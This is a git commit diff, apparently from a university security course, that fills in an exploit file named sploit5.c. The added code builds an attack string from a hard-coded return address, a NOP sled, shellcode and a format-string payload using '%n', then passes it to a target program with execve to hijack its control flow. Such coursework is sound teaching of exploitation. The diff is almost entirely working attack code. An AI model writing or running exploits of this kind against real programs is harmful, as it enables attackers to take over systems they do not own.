36446aa3e6a90a14bd5b0b464f3093d9421957c5
ab <arbeers@wisc.edu>
2023-02-22 09:32:55 -0600

    sploit 5

--- sploits/sploit5.c
+++ sploits/sploit5.c
@@ -11,7 +11,18 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char crack_str[496];
+  int i;
+
+  strcpy(&crack_str[0], "\x8d\xfc\xff\xbf"); //Eip address
+  for(i = 4; i < 434; i++) crack_str[i] = '\x90'; //nop sled
+  strcpy(&crack_str[i], shellcode); 
+  strcpy(&crack_str[i+45], "%d%d%12582426d%n"); //strformat args
+
+
+  args[0] = TARGET;
+  args[1] = crack_str;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
